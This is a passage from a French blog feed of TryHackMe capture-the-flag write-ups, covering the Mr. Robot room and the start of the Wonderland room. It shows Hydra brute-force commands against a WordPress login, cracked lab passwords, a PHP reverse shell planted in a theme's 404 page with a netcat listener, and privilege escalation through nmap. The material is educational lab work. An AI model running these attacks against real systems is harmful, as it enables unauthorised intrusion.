&lt;p&gt;Nous sommes maintenant root, on peut cat le root.txt dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/root/&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209446868-b471e4e6-48e4-467b-91a3-0704466d0bdf.png&#34; alt=&#34;2022-12-24-184141_1401x341_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;gg!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>TryHackMe - Mr. Robot CTF - Medium</title>
      <link>/posts/thm-mrrobot/</link>
      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-mrrobot/</guid>
      <description>mrrobot.thm Difficulty: Medium OS: Linux Description: Based on the Mr. Robot show, can you root this box? Link: https://tryhackme.com/room/mrrobot Note La room √©tait super, super lente‚Ä¶ peut √™tre √† cause du OpenVPN mais en tout cas la partie bruteforce m‚Äôa pris une √©ternit√©
Sinon la room est sympa, assez facile mais c‚Äôest toujours cool
Recon ‚å®Ô∏è nmap -A mrrobot.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-24 13:25 CET Nmap scan report for mrrobot.</description>
      <content>&lt;h1 id=&#34;mrrobotthm&#34;&gt;mrrobot.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;Based on the Mr. Robot show, can you root this box?&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://tryhackme.com/room/mrrobot&#34;&gt;https://tryhackme.com/room/mrrobot&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;La room √©tait super, super lente‚Ä¶ peut √™tre √† cause du OpenVPN mais en tout cas la partie bruteforce m‚Äôa pris une √©ternit√©&lt;/p&gt;
&lt;p&gt;Sinon la room est sympa, assez facile mais c‚Äôest toujours cool&lt;/p&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nmap -A mrrobot.thm&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-24 13:25 CET
Nmap scan report for mrrobot.thm (10.10.80.7)
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn&amp;#39;t have a title (text/html).
443/tcp open   ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Rien de vraiment int√©ressant, on voit juste que le port ssh est ferm√©, donc si on a un mot de passe, on pourra pas se ssh avec&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è dirb http://mrrobot.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442303-522d288a-34de-407f-9e03-2e2eec7c1e1b.png&#34; alt=&#34;2022-12-24-133417_914x681_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Pendant que le dirb tournait, je suis all√© voir dans le /robots.txt, qui nous indique deux fichiers: key-1-of-3.txt et fsocity.dic&lt;/p&gt;
&lt;p&gt;Le premier fichier est le premier flag, donc on peux directement aller le voir par le site&lt;/p&gt;
&lt;p&gt;Pour le deuxi√®me, c‚Äôest un dictionnaire qu‚Äôon va pouvoir utiliser pour bruteforce un form de login&lt;/p&gt;
&lt;p&gt;En se rendant sur /0, on voit que le site est un wordpress, et qu‚Äôil a une page de login: /wp-login&lt;/p&gt;
&lt;h1 id=&#34;brute-force-du-wp-login&#34;&gt;Brute-force du /wp-login&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442308-50799358-cd18-4017-a323-92ca6d79a3fe.png&#34; alt=&#34;2022-12-24-132859_1888x1030_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;En essayant de connecter avec les identifiants admin:admin, on voit qu‚Äôil nous dit que l‚Äôusername est invalide, on peut donc utiliser ce message d‚Äôerreur pour bruteforce le username avec hydra&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442316-6d0d85fd-89de-4652-b5bc-7232483dd6d6.png&#34; alt=&#34;2022-12-24-134445_384x97_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Avant √ßa, on capture la requ√™te avec burp pour voir comment le formulaire envoie les informations de login&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442320-3f1860b2-0e91-469c-99e8-54d210c9e2f2.png&#34; alt=&#34;2022-12-24-134314_275x114_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Il utilise log et pwd, on peut donc lancer hydra avec ces informations&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è hydra -L fsocity.dic -p 1337 mrrobot.thm http-post-form &#39;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In:Invalid username‚Äô&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;-L permet de lui pr√©ciser que le nom d‚Äôutilisateur est une liste de plusieurs noms d‚Äôutilisateurs. On lui donne ensuite comme password ‚Äú1337‚Äù puisqu‚Äôon ne conna√Æt pas le bon password.
Enfin, on lui indique de regarder si le message ‚ÄúInvalid Username‚Äù est pr√©sent dans la r√©ponse&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442340-4eb2a3c0-d054-41be-a4c2-e9aad47dc208.png&#34; alt=&#34;2022-12-24-134534_1883x211_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Il nous trouve un username: &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;Elliot&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Maintenant qu‚Äôon conna√Æt l‚Äôusername, on peut r√©utiliser hydra pour bruteforce le mot de passe&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è hydra -l Elliot -P fsocity.dic mrrobot.thm http-post-form &#39;/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In:The password you‚Äô&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On fait la m√™me chose qu‚Äôavant, mais on lui indique de chercher ‚ÄúThe password you‚Äù&lt;/p&gt;
&lt;p&gt;(cette partie a pris beaucoup de temps)&lt;/p&gt;
&lt;p&gt;Le password d‚Äô&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;Elliot&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; est donc &lt;strong&gt;ER28-0652&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On peux maintenant se connecter au panel admin du wordpress&lt;/p&gt;
&lt;h1 id=&#34;foothold&#34;&gt;Foothold&lt;/h1&gt;
&lt;p&gt;En se balandant un peu dessus, on voit qu‚Äôon peut √©diter les th√®mes, dont les pages php tu th√®me actif&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442355-60213406-4298-489b-be66-fd18817a6974.png&#34; alt=&#34;2022-12-24-150147_421x357_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442358-df03b6d1-11ca-4356-b62e-2be49d06a411.png&#34; alt=&#34;2022-12-24-150227_220x779_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On va donc √©diter la 404 dans laquelle on va mettre un reverse-shell en php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442363-cc029cb3-ca6f-4a59-93f0-ee87f7ce53d7.png&#34; alt=&#34;2022-12-24-150350_1735x793_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On enregistre, puis on se rend sur &lt;a href=&#34;http://mrrobot.thm/1337leet&#34;&gt;http://mrrobot.thm/1337leet&lt;/a&gt; (une page qui n‚Äôexiste pas, donc qui appellera la 404.php)&lt;/p&gt;
&lt;p&gt;Avant de faire √ßa, on lance le netcat sur notre machine&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nc -lvnp 9001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442377-05b0688f-649b-4b7d-b566-d314e86804e7.png&#34; alt=&#34;2022-12-24-150523_1083x508_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On est connect√©s √† la machine, on va voir dans le /home pour savoir si on peut trouver un flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442386-1860ac8a-b35a-4c29-b5dc-fd6b3c7eef34.png&#34; alt=&#34;2022-12-24-150617_498x297_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Il y a bel et bien un flag, mais on a pas la permission puisqu‚Äôon est pas dans notre home&lt;/p&gt;
&lt;h1 id=&#34;lateral-move-daemon---robot&#34;&gt;Lateral move (daemon -&amp;gt; robot)&lt;/h1&gt;
&lt;p&gt;Dans le password.raw-md5, on trouve un hash en raw-md5, qu‚Äôon peut mettre dans &lt;a href=&#34;http://crackstation.net&#34;&gt;http://crackstation.net&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442389-9809ef09-e061-4200-836e-5594d7b9e991.png&#34; alt=&#34;2022-12-24-151445_1033x68_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Maintenant qu‚Äôon a le password de &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;robot&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on doit utiliser su pour changer d‚Äôutilisateur (on ne peut toujours pas se ssh puisque le port est ferm√©)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442392-c52add64-545a-40d1-9b92-115904cf5c0b.png&#34; alt=&#34;2022-12-24-151551_475x126_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;On peut maintenant chercher des vecteurs de privesc, on commence par&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mais √ßa ne retourne rien. On tente de lister les files avec le setuid bit&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è find directory -user root -perm -4000 -exec ls -ldb {} \; &amp;gt;/tmp/results&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mais √ßa ne retourne rien non plus&lt;/p&gt;
&lt;p&gt;A partir de l√† on pourrait lancer linpeas, mais on va d‚Äôabord aller regarder les binaires install√©s sur la machine&lt;/p&gt;
&lt;p&gt;En se baladant dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/usr/local/bin&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on voit que &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;nmap&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; est install√© sur la machine&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442444-0cce9098-e426-46ca-adc7-de0f6912bf71.png&#34; alt=&#34;2022-12-24-152210_353x70_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;En allant sur GTFObins, on voit que nmap peut √™tre utilis√© pour privesc&lt;/p&gt;
&lt;p&gt;‚Üí &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nmap/#shell&#34;&gt;https://gtfobins.github.io/gtfobins/nmap/#shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/209442471-9ad79416-f768-46cd-9d63-d72c8d26ad28.png&#34; alt=&#34;2022-12-24-152255_726x251_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;On est maintenant root, plus qu‚Äô√† cat le dernier flag dans /root&lt;/p&gt;
&lt;p&gt;gg!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>TryHackMe - Wonderland - Medium</title>
      <link>/posts/thm-wonderland/</link>
      <pubDate>Sat, 24 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-wonderland/</guid>
      <description>wonderland.thm Difficulty: Medium OS: Linux Description: Fall down the rabbit hole and enter wonderland. Link: https://tryhackme.com/room/wonderland Note Objectivement, c‚Äôest une bonne room quoique un peu facile pour une ‚Äúmedium‚Äù, mais elle reste plut√¥t sympa puis elle a une sorte ‚Äúd‚Äôhistoire‚Äù, de ‚Äúlogique‚Äù avec le syst√®me de l‚Äô√©num√©ration puis tout les mouvements lat√©raux √† faire avec les users.
Ca aurait √©t√© plus sympa qu‚Äôelle ne crash pas toutes les minutes
Recon ‚å®Ô∏è nmap -A wonderland.</description>
      <content>&lt;h1 id=&#34;wonderlandthm&#34;&gt;wonderland.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;Fall down the rabbit hole and enter wonderland.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://tryhackme.com/room/wonderland&#34;&gt;https://tryhackme.com/room/wonderland&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;Objectivement, c‚Äôest une bonne room quoique un peu facile pour une ‚Äúmedium‚Äù, mais elle reste plut√¥t sympa puis elle a une sorte ‚Äúd‚Äôhistoire‚Äù, de ‚Äúlogique‚Äù avec le syst√®me de l‚Äô√©num√©ration puis tout les mouvements lat√©raux √† faire avec les users.&lt;/p&gt;
&lt;p&gt;Ca aurait √©t√© plus sympa qu‚Äôelle ne crash pas toutes les minutes&lt;/p&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nmap -A wonderland.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728609-7912b8c0-2bd2-4d77-a1bf-ccf7d194279e.png&#34; alt=&#34;2022-12-14-184818_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Rien de tr√®s int√©ressant dans le Nmap, je compte sur le dirb&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è dirb http://wonderland.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728645-1105033f-d603-4d03-9d9b-aa029247f036.png&#34; alt=&#34;2022-12-14-190031_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Le dirb trouve un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/r/&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; je vais voir dessus mais il n‚Äôy a rien de tr√®s int√©ressant, juste la phrase&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;K&lt;/strong&gt;eep going.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;‚Ä¶&lt;/p&gt;
&lt;p&gt;Il y avait une image sur la page principale:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728797-8ade696b-b5c2-4052-8952-12f037292e8d.png&#34; alt=&#34;2022-12-14-184717_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Je la met dans &lt;a href=&#34;https://www.aperisolve.com/&#34;&gt;Aperi‚ÄôSolve&lt;/a&gt;, et je vois que &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;steghide&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; a trouv√© quelque chose d‚Äôint√©ressant:&lt;/p&gt;
&lt;p&gt;Il y a un fichier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hint.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans l‚Äôimage, dans lequel il est √©crit:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;follow the r a b b i t&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Je comprend assez vite que dans le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/r/&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, il y a &lt;strong&gt;/a/&lt;/strong&gt;, puis &lt;strong&gt;/b/&lt;/strong&gt;, etc‚Ä¶&lt;/p&gt;
&lt;p&gt;‚Üí &lt;a href=&#34;http://wonderland.thm/r/a/b/b/i/t/&#34;&gt;http://wonderland.thm/r/a/b/b/i/t/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728867-224beb06-9b10-45a2-9040-2cdf6b30c025.png&#34; alt=&#34;2022-12-14-190409_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Puisqu‚Äôon a fini d‚Äô√©peller le mot &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;rabbit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, on peut partir du principe qu‚Äôon est cette fois sur la bonne page. En regardant le code source on trouve ceci:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728897-e0ffe71b-9f37-4456-a26d-6eaded2fdb75.png&#34; alt=&#34;2022-12-14-190416_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;alice:HowDothTheLittleCrocodileImproveHisShiningTail&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ssh alice@wonderland.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207728942-58c1a333-8faa-4034-a673-d980dd49013e.png&#34; alt=&#34;2022-12-14-190517_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;lateral-move-alice--rabbit&#34;&gt;Lateral move (alice ‚Üí rabbit)&lt;/h1&gt;
&lt;p&gt;Je commence par un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, qui retourne ceci:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; alice on wonderland:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    env_reset, mail_badpass, secure_path&lt;span style=&#34;color:#f92672&#34;&gt;=/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snap&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User alice may run the following commands on wonderland:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (rabbit) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;python3&lt;span style=&#34;color:#ae81ff&#34;&gt;.6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;home&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;alice&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;walrus_and_the_carpenter&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;alice&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; a donc la permission d‚Äô√©xecuter &lt;strong&gt;/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py&lt;/strong&gt; en tant que &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;rabbit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On va cat le .py pour voir un peu ce qu‚Äôil y a dedans&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;poem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;The sun was shining on the sea,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Shining with all his might:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;He did his very best to make
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The billows smooth and bright ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;And this was odd, because it was
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The middle of the night.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The moon was shining sulkily,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Because she thought the sun
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Had got no business to be there
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;After the day was done ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;It‚Äôs very rude of him,&amp;#34; she said,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;To come and spoil the fun!&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The sea was wet as wet could be,
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The sands were dry as dry.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;You could not see a cloud, because
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;No cloud was in the sky:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;No birds were flying over head ‚Äî
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;There were no birds to fly.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Walrus and the Carpenter
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Were walking close at hand;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;They wept like anything to see
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Such quantities of sand:
